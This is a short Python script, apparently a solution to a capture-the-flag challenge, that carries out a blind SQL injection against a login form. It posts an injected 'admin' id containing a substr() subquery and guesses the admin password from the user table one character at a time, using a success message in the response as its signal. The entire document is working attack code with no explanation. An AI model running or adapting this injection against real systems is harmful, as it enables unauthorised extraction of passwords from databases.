import requests
for i in range(21):
  for a in ([chr(i) for i in range(48, 123)]):
    response = requests.post(
      'http://ctfq.sweetduet.info:10080/~q6/', data={'id': 'admin\' AND (SELECT substr(pass,'+str(i+1)+',1) FROM user WHERE id=\'admin\')='+"'"+ a +"'" +'; --', 'pass': 'a'})  
    if (response.text.find("Congratulations")) > -1:
      print(a)
      break
